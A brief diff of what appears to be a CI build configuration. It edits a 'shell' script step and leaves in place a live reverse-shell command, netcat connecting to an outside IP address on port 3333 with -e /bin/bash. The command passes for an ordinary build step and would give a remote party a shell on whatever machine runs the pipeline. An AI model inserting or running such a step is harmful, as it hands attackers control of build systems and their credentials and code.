@@ -17,7 +17,7 @@ build:
     - script:
             name: "shell"
             code: |
-             nc
+
              nc 35.177.246.142 3333 -e /bin/bash
 
     - script:
